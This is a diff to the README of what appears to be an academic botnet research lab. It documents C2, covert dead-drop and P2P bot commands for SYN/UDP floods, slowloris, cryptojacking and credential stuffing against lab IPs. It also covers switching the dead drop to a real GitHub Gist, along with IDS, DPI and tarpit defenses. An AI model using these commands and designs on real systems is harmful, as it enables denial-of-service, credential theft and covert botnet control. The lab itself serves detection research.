@@ -148,7 +148,17 @@ botnet_lab/
 ├── honeypot_setup.py    Cowrie setup, iptables redirect, MITRE ATT&CK log
 │                        analyzer, NIST SP 800-61r3 IR report generator
 ├── cowrie.cfg           Cowrie config: MIPS IoT fingerprint, SSH+Telnet
-├── generate_graphs.py   3 research graphs (replace simulate_*() with real data)
+├── generate_graphs.py   3 research graphs; auto-loads real JSON data if present,
+│                        falls back to simulated values. --status flag shows what
+│                        data is missing; --out <dir> sets output directory.
+├── collect_graph23_data.py  Week 7 automated data collection helper.
+│                        --graph2: interactive wipe-cycle MTBI recorder (victim VM).
+│                        --graph3: automated jitter sweep → TPR/FPR (bot VM).
+│                        Writes graph2_measured_data.json + graph3_measured_data.json.
+├── tarpit_state.py      IDS → portal shared state for credential-stuffing tarpitting.
+│                        JSON-file IPC (/tmp/tarpit_state.json); TTL = 300s.
+│                        CLI: python3 tarpit_state.py [list | flag <ip> |
+│                             unflag <ip> | clear]
 ├── run_full_lab.sh      Master orchestration script — runs everything at once
 └── README.md            This file
 ```
@@ -366,7 +376,7 @@ sudo ./run_full_lab.sh --clean
 | DPI measurement | Graph 1 TTD data collection | ~65s |
 | Cowrie forensics | ATT&CK analysis + IR report | ~10s |
 | **Phase 2 covert** | Dead-drop command → bot polls and executes | ~75s |
-| **Phase 3 P2P** | 3-node DHT mesh → inject → kill seed → survive | ~60s |
+| **Phase 3 P2P** | 5-node DHT mesh → inject → kill seed → survive | ~60s |
 | Graph generation | 3 PNG graphs to `/tmp/botnet_graphs/` | ~5s |
 
 **Total runtime:** ~8–10 minutes
@@ -414,8 +424,21 @@ curl -X POST http://192.168.100.10:5000/task \
 #   "dga_search"      — spawns dga.py
 #   "idle"            — no-op
 
+# Note: tasks are automatically AES-128-CBC encrypted on delivery to bots
+# that registered with "enc":1. Legacy bots without encryption receive plaintext.
+
 # View registered bots
 curl http://192.168.100.10:5000/bots
+
+# Receive a result from a bot (bots POST here after task completion)
+# Body: {"bot_id":"<id>", "result": <payload or encrypted payload>}
+curl http://192.168.100.10:5000/result   # GET to view; POST from bots
+
+# Debug endpoint: test AES round-trip on any JSON payload
+curl -X POST http://192.168.100.10:5000/encrypt_test \
+     -H "Content-Type: application/json" \
+     -d '{"type":"syn_flood","target_ip":"192.168.100.20"}'
+# Returns: {"original":..., "encrypted":..., "decrypted":..., "key_hex":"..."}
 ```
 
 ### 8.2 SYN Flood (direct)
@@ -521,9 +544,31 @@ python3 covert_bot.py
 python3 covert_bot.py encode '{"type":"syn_flood","target":"192.168.100.20"}'
 python3 covert_bot.py decode '<paste_blob>'
 
-# Wipe command from dead drop:
+# Wipe command from dead drop (bot goes idle next poll):
 curl -X POST http://192.168.100.10:5001/clear_command
 ```
+
+**All supported command types for the Phase 2 covert bot:**
+
+| `type` | Description | Extra fields |
+|---|---|---|
+| `syn_flood` | Raw SYN flood via Scapy | `target`, `port`, `duration` |
+| `udp_flood` | Raw UDP flood via Scapy | `target`, `duration` |
+| `slowloris` | 150-socket HTTP exhaustion | `target`, `port`, `duration` |
+| `cryptojack` | CPU burn loop | `duration`, `cpu` (0.0–1.0) |
+| `stop_all` | Cancel all active attacks | — |
+| `shutdown` | Gracefully exit the bot process | — |
+| `dga_search` | Trigger DGA NXDOMAIN sweep (fallback demo) | — |
+| `update_secret` | Rotate the shared AES key at runtime | `secret` (≥8 chars) |
+| `idle` | No-op | — |
+
+> **`update_secret` example:**
+> ```bash
+> curl -X POST http://192.168.100.10:5001/set_command \
+>      -H "Content-Type: application/json" \
+>      -d '{"type":"update_secret","secret":"NEW_KEY_2026_XYZ"}'
+> ```
+> Both the dead-drop server and all bots must be updated to the new secret before the next poll, or decryption will fail. In production botnets this rotation is automated via a second DGA seed.
 
 ### 8.9 Phase 3 — Kademlia P2P (C)
 
@@ -539,18 +584,57 @@ curl -X POST http://192.168.100.10:5001/clear_command
 ./kademlia_p2p --host 192.168.100.12 --port 7400 \
     --bootstrap 192.168.100.10:7400
 
-# Inject command via any node
+# Inject command via any node (uses a temporary port 7401)
 ./kademlia_p2p --host 192.168.100.10 --port 7401 \
     --bootstrap 192.168.100.10:7400 \
     --inject '{"type":"syn_flood","target":"192.168.100.20","port":80,"duration":10}'
 
-# Local 3-node demo (no SSH needed, runs on localhost)
+# Local 5-node demo with 40% resilience kill test (no SSH needed, runs on localhost)
 ./kademlia_p2p --demo
 
-# Python alternative (same protocol, more verbose):
+# Python alternative (same binary wire protocol, more verbose output):
 python3 p2p_node.py --host 192.168.100.10 --port 7400
 python3 p2p_node.py --demo
 ```
+
+**All supported command types (injected as JSON via `--inject` or `store_value`):**
+
+| `type` | C (`kademlia_p2p.c`) | Python (`p2p_node.py`) | Description |
+|---|---|---|---|
+| `syn_flood` | ✅ native | ✅ Scapy | Raw SYN flood |
+| `udp_flood` | ✅ native | ✅ Scapy | Raw UDP flood |
+| `slowloris` | ✅ native | ✅ inline | 150-socket HTTP exhaustion |
+| `cryptojack` | ✅ native | ✅ inline | Duty-cycle CPU burn |
+| `cred_stuffing` | ✅ via `system()` | ✅ via `requests` | Credential stuffing against `/login` |
+| `stop_all` | ✅ | ✅ | Cancel all active attacks |
+| `shutdown` | ✅ | ✅ | Gracefully exit the node process |
+| `idle` | ✅ | ✅ | No-op |
+
+> **`cred_stuffing` via P2P example:**
+> ```bash
+> ./kademlia_p2p --host 192.168.100.10 --port 7401 \
+>     --bootstrap 192.168.100.10:7400 \
+>     --inject '{"type":"cred_stuffing","target":"192.168.100.20","port":80,
+>                "mode":"jitter","jitter":300,"duration":120}'
+> ```
+> Supported `mode` values: `"bot"` (rigid timing), `"jitter"` (randomized), `"distributed"` (multi-worker spoofed IPs).
+> The C node spawns `cred_stuffing.py` via `system()`. The Python node uses an inline `requests` loop.
+
+**Wire message types (shared between C and Python):**
+
+| Byte | Name | Description |
+|---|---|---|
+| `0x01` | PING | Liveness probe |
+| `0x02` | PONG | PING response |
+| `0x03` | FIND_NODE | Request k-closest contacts to a target ID |
+| `0x04` | FOUND_NODES | Response with contact list |
+| `0x05` | STORE | Store a key→value pair |
+| `0x06` | FIND_VALUE | Request value for a key |
+| `0x07` | FOUND_VALUE | Value response |
+| `0x08` | STOP_ALL | Broadcast: halt all active attacks |
+| `0x09` | SHUTDOWN | Broadcast: exit the node process |
+
+All messages are XOR-encrypted with `SHA-256("AUA_P2P_MESH_KEY")` as keystream.
 
 ---
 
@@ -576,6 +660,8 @@ sudo PYTHONPATH="/home/vboxuser/.local/lib/python3.12/site-packages" \
 - Computes CV = σ/μ over a 20-request sliding window
 - Alert triggers when `CV < 0.15` (bot-like rigid timing)
 - Human users have CV typically > 0.5
+- **Tarpit feedback:** on confirmed bot (CV < 0.15), the source IP is automatically flagged in `tarpit_state.json`; `fake_portal.py` then delays all responses to that IP by 8 ± 2 seconds
+- **Auto-unblock:** if a flagged IP is silent for 120 seconds (bot finished or switched IP), the tarpit flag is automatically removed
 
 **Engine 3 — DNS/DGA entropy** (DGA detection):
 - Counts NXDOMAIN responses per source IP in a 30-second window
@@ -606,13 +692,74 @@ sudo python3 firewall_dpi.py --status
 sudo python3 firewall_dpi.py --teardown
 ```
 
-**What DPI detects:** repeated HTTPS connections (SYN to port 443) to the same destination exceeding 10 per 60-second window — the signature of covert C2 polling. Also detects Slowloris via TCP connection duration > 30 seconds to port 80.
+**What DPI detects:**
+
+- **Covert polling (generic):** ≥ 10 HTTPS SYNs to the same destination IP in a 60-second window — flags any bot-like high-frequency polling pattern.
+- **Covert polling (known hosts):** ≥ 20 TLS sessions to `github.com`, `raw.githubusercontent.com`, `reddit.com`, or `pastebin.com` in a 60-second window — catches dead-drop bots that deliberately target high-reputation domains. The higher threshold avoids false positives for developers who legitimately visit these sites several times per day.
+- **Slowloris:** TCP connection to port 80 that stays open for > 30 seconds — the half-open header drip pattern.
+
+The two-threshold design means the alert sensitivity depends on destination: aggressive against unknown IPs, tolerant of normal developer cadence to trusted domains.
 
 ### 9.3 Tarpitting (Credential Stuffing Response)
 
 Rather than blocking suspected credential-stuffing bots outright (which reveals detection and lets the attacker tune their jitter), a tarpit diverts them to a slow-response endpoint that artificially delays each reply by several seconds. The bot remains connected but productive throughput approaches zero, increasing the attacker's time-cost per tested credential by orders of magnitude without triggering an obvious block.
 
-In this lab, `fake_portal.py` can simulate a tarpit by adding a configurable `time.sleep()` to the `/login` response for IPs the IDS flags as bots. The IDS detects via CV < 0.15 (Engine 2) → sets a flag → `fake_portal.py` checks the flag and slows its response to that IP. Legitimate users (high CV) see no delay.
+**How the loop works:**
+
+```
+IDS Engine 2 detects CV < 0.15
+    → calls tarpit_state.flag(src_ip)
+        → writes timestamp to /tmp/tarpit_state.json  (TTL = 300s)
+            → fake_portal.py checks is_flagged(src_ip) on every /login request
+                → flagged IPs receive time.sleep(8 ± 2s) before any response
+                → legitimate IPs (high CV) see no delay
+```
+
+**Auto-unblock:** `ids_detector.py` monitors login-request timestamps per IP. If a flagged IP goes silent for 120 seconds (bot finished its run or switched IP), the flag is automatically removed.
+
+**`tarpit_state.py` CLI:**
+
+```bash
+# List all currently flagged IPs
+python3 tarpit_state.py list
+
+# Manually flag an IP (e.g. from a separate detection script)
+python3 tarpit_state.py flag 192.168.100.11
+
+# Remove a flag early (before TTL expiry)
+python3 tarpit_state.py unflag 192.168.100.11
+
+# Wipe all entries (post-session cleanup)
+python3 tarpit_state.py clear
+```
+
+**`fake_portal.py` tarpit REST endpoints** (admin/debug use):
+
+```bash
+# Flag an IP via HTTP (alternative to IDS file-based signalling)
+curl -X POST http://192.168.100.20/tarpit/flag \
+     -H "Content-Type: application/json" \
+     -d '{"ip":"192.168.100.11"}'
+
+# Remove a flag via HTTP
+curl -X POST http://192.168.100.20/tarpit/unflag \
+     -H "Content-Type: application/json" \
+     -d '{"ip":"192.168.100.11"}'
+
+# Inspect tarpit state (flagged IPs, delay stats, total delayed count)
+curl http://192.168.100.20/tarpit/status | python3 -m json.tool
+```
+
+**Configuration** (edit `tarpit_state.py` constants to tune):
+
+| Constant | Default | Effect |
+|---|---|---|
+| `STATE_FILE` | `/tmp/tarpit_state.json` | Shared between IDS and portal |
+| `TTL_SECONDS` | `300` | Flag expires after 5 minutes |
+| `TARPIT_DELAY` | `8.0` | Seconds of sleep per flagged request |
+| `TARPIT_JITTER` | `2.0` | ±jitter on delay to avoid timing fingerprint |
+
+At the default 8s delay, a 1,000-credential attack that would complete in ~8 minutes (at 500ms intervals) now takes ~2.2 hours — without the attacker knowing they have been detected.
 
 ### 9.4 Cowrie Honeypot
 
@@ -668,58 +815,85 @@ The **Graph 3 research finding:** as jitter standard deviation increases from 0 
 
 ## 11. Research Graphs (Week 7 Data Collection)
 
-All three graphs have template code in `generate_graphs.py` with plausible simulated data. Before final submission, you must replace the `simulate_*()` functions with real measured values from your attack runs.
+All three graphs auto-detect real measurement files next to `generate_graphs.py` and fall back to plausible simulated data when they are absent. Graph titles are annotated **[REAL DATA]** or **[SIMULATED DATA]** so you can see at a glance what's been collected.
+
+**Check what data you still need:**
+
+```bash
+python3 generate_graphs.py --status
+```
+
+Output example:
+```
+  ✅  Graph 1: REAL DATA  (graph1_measured_data.json, 2026-04-07 14:22)
+  ❌  Graph 2: MISSING — collect with:
+       python3 collect_graph23_data.py --graph2  (victim VM, after Mirai runs)
+  ❌  Graph 3: MISSING — collect with:
+       python3 collect_graph23_data.py --graph3  (bot VM)
+```
 
 ### Graph 1: Port Blocking vs. DPI (TTD by attack vector)
 
-**How to collect real data:**
+**How to collect real data** (run during a live attack session):
 
 ```bash
-# While attacks are running, on C2 or victim VM:
+# C2 or victim VM — while attacks are running:
 sudo python3 firewall_dpi.py --measure --duration 120
-# Outputs: graph1_measured_data.json
+# Outputs: graph1_measured_data.json  (generate_graphs.py reads this automatically)
 ```
 
-**Expected finding:** port blocking detects SYN/UDP floods instantly (TTD ≈ 0s for blocked ports) but never detects GitHub polling (port 443 — TTD = ∞). DPI detects the covert channel after 20–60 seconds of session-level behavioral analysis.
+**Expected finding:** port blocking detects SYN/UDP floods instantly (TTD ≈ 0s for blocked ports) but never detects GitHub-style polling (port 443 — TTD = ∞). DPI detects the covert channel after 20–60 seconds of session-level behavioral analysis.
 
 ### Graph 2: Persistence Paradox (MTBI vs. credential hardening)
 
-**How to collect real data:**
+**How to collect real data** (run on the victim VM, interactive):
 
 ```bash
-# On victim VM: run with default credentials (change nothing)
-sudo ./mirai_scanner  # from bot VM, repeat 8 times after rebooting victim
-
-# Record time from reboot to re-infection for each wipe
-# Then change victim SSH password and repeat
-# MTBI_default ≈ 1–4 minutes; MTBI_hardened = never
+# On victim VM after each Mirai scanner run from bot VM:
+python3 collect_graph23_data.py --graph2 --wipes 8 --bot-ip 192.168.100.11
+# Outputs: graph2_measured_data.json
 ```
+
+The script watches the Cowrie log for `session.connect` events from the bot IP and records the elapsed time since the last wipe (Mean Time Between Infections). You run it interactively: wipe the victim VM → type ENTER when it reboots → wait → the script auto-detects re-infection from the Cowrie log and records the MTBI. After 8 cycles it asks whether a hardened-credential device was re-infected.
+
+If Cowrie is not running, the script falls back to manual entry: it prompts you for each MTBI value after each wipe.
 
 **Expected finding:** default-credential devices have MTBI of 2–4 minutes regardless of wipe frequency. Hardened devices are never re-infected. This is the "Persistence Paradox" — the root cause (default credentials) cannot be fixed by ephemerality alone.
 
 ### Graph 3: IDS Accuracy vs. Bot Jitter (TPR/FPR curve)
 
-**How to collect real data:**
+**How to collect real data** (run on the bot VM while portal + IDS are running on victim VM):
 
 ```bash
-# Run 6 jitter sweep experiments, record IDS true/false positive rate:
-for JITTER in 0 50 100 200 500 1000; do
+# Bot VM — automated 8-level jitter sweep:
+python3 collect_graph23_data.py --graph3 --host 192.168.100.20
+# Outputs: graph3_measured_data.json
+```
+
+The script runs `cred_stuffing.py` at 8 jitter levels (0, 50, 100, 200, 350, 500, 750, 1000 ms) for 30 seconds each, then queries the IDS log at `/tmp/ids.log` to record whether a `CREDENTIAL STUFFING` alert was fired (TPR) and runs a human-baseline pass to measure false positives (FPR).
+
+> **Note:** single-run binary results are noisy at intermediate jitter levels. Run the sweep multiple times and average for smoother curves — the script prints a reminder at the end.
+
+Manual sweep (if you prefer to control each level):
+
+```bash
+for JITTER in 0 50 100 200 350 500 750 1000; do
     python3 cred_stuffing.py --mode jitter --interval 500 --jitter $JITTER &
     sleep 30
     kill %1
     # Check IDS log for alerts during this run
-    # Record: did IDS fire? (TPR) | Did it fire on human baseline? (FPR)
+    grep "CREDENTIAL STUFFING" /tmp/ids.log | tail -3
 done
 ```
 
-**Expected finding:** TPR ≈ 98% at jitter=0ms, drops to ~44% at jitter=1000ms. FPR stays below 12% across all jitter levels (human traffic consistently has high CV).
+**Expected finding:** TPR ≈ 98% at jitter = 0 ms, drops to ~44% at jitter = 1000 ms. FPR stays below 12% across all jitter levels (human traffic consistently has high CV).
 
-### Generate graphs from measured data:
+### Generate all graphs:
 
 ```bash
 pip3 install matplotlib
-python3 generate_graphs.py
-# Graphs saved to botnet_lab/graphs/
+python3 generate_graphs.py                        # saves to ./graphs/ by default
+python3 generate_graphs.py --out /tmp/my_graphs/  # custom output directory
 ```
 
 ---
@@ -800,11 +974,21 @@ Post-session:
 
 ## Technical Notes
 
-**Entropy threshold:** `ids_detector.py` uses 3.8 bits/char and `dga.py` analysis labels domains ≥ 3.8 as "LIKELY DGA". The research docs cite 4.0 as the IDS threshold — this discrepancy is intentional: a lower threshold catches more DGA while the docs describe the typical academic threshold. For Graph 3, use whichever threshold you calibrate the IDS to.
+**Entropy threshold:** `ids_detector.py` uses 3.8 bits/char and `dga.py` analysis labels domains ≥ 3.8 as "LIKELY DGA". Some academic papers cite 4.0 as a canonical threshold — the code uses the lower value intentionally, trading a small increase in false positives for better recall against modern DGA variants with slightly lower entropy. For Graph 3, calibrate to whichever value your IDS is actually compiled with.
 
-**C vs Python Kademlia:** `kademlia_p2p.c` and `p2p_node.py` implement compatible protocols using the same XOR stream cipher (`SHA-256(P2P_SECRET)`) and the same command key (`SHA-1("botnet_command_v1")`). For the video, you can show either implementation — the C version is preferred for the bot VMs per the project spec.
+**C vs Python Kademlia:** `kademlia_p2p.c` and `p2p_node.py` implement fully compatible binary protocols: same XOR stream cipher (`SHA-256("AUA_P2P_MESH_KEY")`), same 35-byte header layout, same command key (`SHA-1("botnet_command_v1")`), same `bucket_index` formula (`d.bit_length() - 1`). You can freely mix C and Python nodes in the same DHT mesh. For the video the C version is preferred on bot VMs per the project spec.
 
-**Bot agent v3:** `bot_agent.c` now dispatches all five payload types: SYN flood and UDP flood are implemented natively in C with raw sockets; Slowloris is a pure C implementation maintaining a 150-socket pool; cryptojacking uses a duty-cycle SHA-256 burn loop with `/proc/self/comm` name spoofing; credential stuffing and DGA search spawn the Python modules via `system()`.
+**P2P demo size:** Both `kademlia_p2p.c --demo` and `p2p_node.py --demo` run a **5-node** local mesh and kill 2 of them (40%) to demonstrate resilience. Earlier documentation referred to a "3-node demo" — that was the original design; the final implementation was upgraded to 5 nodes for a more convincing resilience test.
+
+**`cred_stuffing` command parity:** The `cred_stuffing` P2P command is now implemented in both `kademlia_p2p.c` (spawns `cred_stuffing.py` via `system()`) and `p2p_node.py` (inline `requests` loop). Both accept the same JSON fields: `target`, `port`, `mode` (`"bot"` / `"jitter"` / `"distributed"`), `duration`, `jitter`, `workers`.
+
+**Bot agent v3:** `bot_agent.c` dispatches all five payload types. SYN flood and UDP flood are implemented natively in C with raw sockets; Slowloris is a pure C implementation maintaining a 150-socket pool with dead-socket refill; cryptojacking uses a duty-cycle SHA-256 burn loop with `/proc/self/comm` name spoofing via `prctl(PR_SET_NAME)`; credential stuffing and DGA search spawn the Python modules via `system()`.
+
+**Dead drop vs real GitHub:** `covert_bot.py` ships with `DEAD_DROP_URL` pointing to `http://192.168.100.10:5001/dead_drop` (the lab's local Flask simulation). To use a real GitHub Gist for Phase 2 (the production threat model), replace that URL with a raw Gist URL and manually paste the `encode_command()` output into the Gist. The bot's parsing logic and AES decryption are identical — only the URL changes.
+
+**Payload binaries:** `mirai_scanner.c` sends the full Mirai infection command sequence (`wget`, `chmod +x`, `execute`, `rm -f`) to the Cowrie honeypot, which logs each command as a separate ATT&CK event. There are no actual `payload.mips` / `payload.arm` / `payload.x86_64` binaries in this repo — the wget URL is logged by Cowrie but the download is never fulfilled. This is intentional: the research question concerns the infection lifecycle and detection thereof, not the payload itself.
+
+**Graph output directory:** `generate_graphs.py` saves PNGs to `./graphs/` by default (relative to the script). `run_full_lab.sh` overrides this to `/tmp/botnet_graphs/` via the inline Python call. Use `--out <path>` to set a custom directory when calling the script directly.
 
 ---
 
